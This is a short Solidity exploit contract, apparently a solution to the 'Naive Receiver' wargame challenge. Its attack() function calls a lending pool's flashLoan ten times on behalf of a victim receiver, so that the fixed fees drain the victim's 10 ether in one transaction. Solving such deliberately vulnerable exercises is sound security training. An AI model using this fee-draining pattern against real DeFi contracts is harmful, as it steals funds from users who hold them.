pragma solidity 0.8.17;

import "./NaiveReceiverLenderPool.sol";

contract attackFlashLoan {
    NaiveReceiverLenderPool public pool;
    address victim;
    address owner;    

    constructor(address payable _pooladdress, address _receiverAddress) {
        pool = NaiveReceiverLenderPool(_pooladdress);
        victim = _receiverAddress;
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner);
        // collects all 10 ether in one transaction
        for(uint i=0;i < 10; i++) {
            // doesn't matter how much is borrowed
            // as long as we collct the fee 10 times
            pool.flashLoan(victim, 1 ether);
        }
    }

}